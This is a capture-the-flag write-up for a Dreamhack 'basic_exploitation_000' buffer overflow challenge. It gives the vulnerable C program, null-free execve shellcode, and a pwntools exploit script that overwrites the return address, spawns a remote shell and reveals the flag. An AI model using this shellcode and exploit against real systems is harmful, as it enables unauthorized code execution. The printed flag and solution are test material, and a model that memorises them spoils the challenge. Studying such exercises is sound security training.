### Overview
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}

```

Look at the challenge, we can see that this is a common return2shellcode pwn challenge!

I checked the file and it's stacl is executable, so we can return to `buf` which is execute our shellcode.

Now let's create a 32 bit shellcode to exploit this challenge.

I know that we must write shellcode such that when it compile to opcode, it would not have null byte.

The following shell code is satify that, i think, but when i run it remotely, it doesnt work properly:

```
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor ecx, ecx 
xor edx, edx 
xor eax, eax
add eax, 0x0b
int 0x80
```
I dont know why???
But I tried another way and it worked!!

### exploit
```
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor ecx, ecx 
xor edx, edx 
mov al, 0x8
add al, 0x3
int 0x80
```
This is the final shellcode, assemble it to hex and get flag:

```py
from pwn import *
p = remote('host3.dreamhack.games', 16708)
shellcode = b'\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x31\xC9\x31\xD2\xB0\x08\x04\x03\xCD\x80'

p.recvuntil(b'(')
buf = int(p.recv(10), 16)
print(f"buf: {hex(buf)}")
p.recvuntil(b')')
payload = shellcode.ljust(132, b'A') + p32(buf)
p.send(payload)
p.interactive()
```
Flag

```
$ python3 exploit.py
[+] Opening connection to host3.dreamhack.games on port 16708: Done
buf: 0xffba36a8
[*] Switching to interactive mode

$ ls
$ ls
basic_exploitation_000
flag
run.sh
$ cat flag
DH{465dd453b2a25a26a847a93d3695676d}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 16708
```